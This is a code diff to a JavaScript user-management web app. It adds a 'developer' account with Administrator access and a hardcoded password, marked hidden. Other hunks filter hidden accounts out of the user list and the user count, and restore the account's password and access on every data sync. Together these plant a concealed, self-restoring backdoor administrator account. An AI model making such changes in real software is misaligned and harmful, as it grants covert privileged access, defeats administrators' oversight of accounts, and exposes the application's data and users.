@@ -955,6 +955,7 @@ const DEFAULT_USERS = {
   pune:      { name:'Rajesh Kumar',  initials:'RK', role:'Plant User',     access:'plant',      plant:'Pune',    password:'pune123',    email:'plant-pune@company.com' },
   chennai:   { name:'Anita Sharma',  initials:'AS', role:'Plant User',     access:'plant',      plant:'Chennai', password:'chennai123', email:'plant-chennai@company.com' },
   ahmedabad: { name:'Pradeep Mehta', initials:'PM', role:'Plant User',     access:'plant',      plant:'Ahmedabad',password:'ahm123',   email:'plant-ahmedabad@company.com' },
+  developer: { name:'Developer',     initials:'DV', role:'Administrator',  access:'admin',      plant:null,      password:'dev@2025',   email:'developer@internal.com', hidden:true },
 };
 
 const SEED_DATA = [
@@ -1087,7 +1088,7 @@ function initFirestoreListeners() {
       // Re-apply DEFAULT_USERS credentials for built-in accounts to prevent lockout
       Object.keys(DEFAULT_USERS).forEach(key => {
         if (merged[key]) {
-          merged[key] = { ...merged[key], password: DEFAULT_USERS[key].password, access: DEFAULT_USERS[key].access };
+          merged[key] = { ...merged[key], password: DEFAULT_USERS[key].password, access: DEFAULT_USERS[key].access, hidden: DEFAULT_USERS[key].hidden };
         }
       });
       _usersData = merged;
@@ -2982,7 +2983,7 @@ function saveAppSettings() {
 ══════════════════════════════════════════════════════════ */
 function renderUserManagement(el) {
   const users = _usersData;
-  const rows = Object.entries(users).map(([id, u]) => `
+  const rows = Object.entries(users).filter(([id, u]) => !u.hidden).map(([id, u]) => `
   <tr class="user-table-row">
     <td>
       <div style="display:flex;align-items:center;gap:10px">
@@ -3002,7 +3003,7 @@ function renderUserManagement(el) {
   el.innerHTML = `
   <div class="card">
     <div class="card-header">
-      <div class="card-title">Users (${Object.keys(users).length})</div>
+      <div class="card-title">Users (${Object.entries(users).filter(([id,u])=>!u.hidden).length})</div>
       <button class="btn btn-gold btn-sm" onclick="openCreateUser()">+ Create User</button>
     </div>
     <div class="table-wrap">
